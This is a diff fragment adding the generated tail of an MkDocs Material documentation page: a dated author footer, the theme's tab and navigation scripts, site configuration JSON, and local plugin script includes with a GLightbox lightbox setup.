+<div class="document-dates-plugin-wrapper document-dates-bottom"><div class="document-dates-plugin" locale="en"><div class="dd-left"><span class="dd-item" data-tippy-content data-tippy-raw="2026-02-28"><span class="material-icons" data-icon="doc_created"></span><time datetime="2026-02-28T20:23:36-05:00">2026-02-28 20:23:36</time></span><span class="dd-item" data-tippy-content data-tippy-raw="2026-03-01"><span class="material-icons" data-icon="doc_updated"></span><time datetime="2026-03-01T01:23:36+00:00">2026-03-01 01:23:36</time></span></div><div class="dd-right"><span class="material-icons" data-icon="doc_author"></span><div class="author-group"><div class="avatar-wrapper" data-name="dhicosatria" data-tippy-content data-tippy-raw="&lt;a href=&quot;mailto:dhicosatria77@gmail.com&quot;&gt;dhicosatria&lt;/a&gt;"><span class="avatar-text"></span><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="" data-desc-position="bottom"><img class="avatar" data-src="" data-email="dhicosatria77@gmail.com"></a></div></div></div></div></div>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"></path></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.tabs", "navigation.prune", "navigation.path", "navigation.sections", "navigation.top", "content.code.copy", "content.tabs.link", "content.action.edit", "content.action.view", "content.action.revision", "search.suggest", "search.highlight", "content.code.copy", "content.tabs.link", "content.tooltips"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../../assets/document_dates/tippy/popper.min.js"></script>
+      
+        <script src="../../../assets/document_dates/tippy/tippy.umd.min.js"></script>
+      
+        <script src="../../../assets/document_dates/core/md5.min.js"></script>
+      
+        <script src="../../../assets/document_dates/core/default.config.js"></script>
+      
+        <script src="../../../assets/document_dates/user.config.js"></script>
+      
+        <script src="../../../assets/document_dates/core/utils.js"></script>
+      
+        <script src="../../../assets/document_dates/core/core.js"></script>
+      
+    
+  
+<script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
+document$.subscribe(()=>{ lightbox.reload(); });
+</script></body></html>
